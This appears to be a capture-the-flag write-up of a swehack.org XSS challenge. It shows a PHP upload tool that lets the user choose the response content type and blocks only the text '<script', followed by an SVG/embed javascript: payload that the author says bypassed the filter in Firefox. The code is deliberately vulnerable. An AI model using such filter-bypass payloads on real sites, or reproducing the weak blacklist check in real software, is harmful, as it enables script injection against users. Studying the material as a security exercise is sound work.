
This challenge was posted on swehack.org and was made by avlidienbrunn

https://swehack.org/viewtopic.php?f=37&t=1735

The source:
```
<?php
//File converter, upload and get right file type...
if(!isset($_POST["submit"])) {
?>
Tjaba! Med detta tool kan du kolla på dina filer som om de vore XML, PDF eller binärer :) Kul va!
<form enctype="multipart/form-data" action="" method="POST">
<input type="file" name="file" />
<select name="type">
<option>xml</option>
<option>pdf</option>
<option>octet-stream</option>
</select>
<input name="submit" type="submit" />
</form>

<?php
die;
}
$contenttype = $_POST['type'];
//Longest one in the list...
if(strlen($contenttype) > strlen("octet-stream")){
   die("invalid type");
}
//Get file content
$content = file_get_contents($_FILES["file"]["tmp_name"]);
if($content == ""){
   $content = $_POST['file'];
}
//XSS protections
if(preg_match('/<script/', $content)){
   die("Hacking attempt!!!!");
}
header('Content-Type: application/'.$contenttype);
echo $content;
?>
```
This was my solution (worked in ff):
```
<svg><embed xmlns="http://www.w3.org/1999/xhtml" src="javascript:alert(1)" /></svg>
```
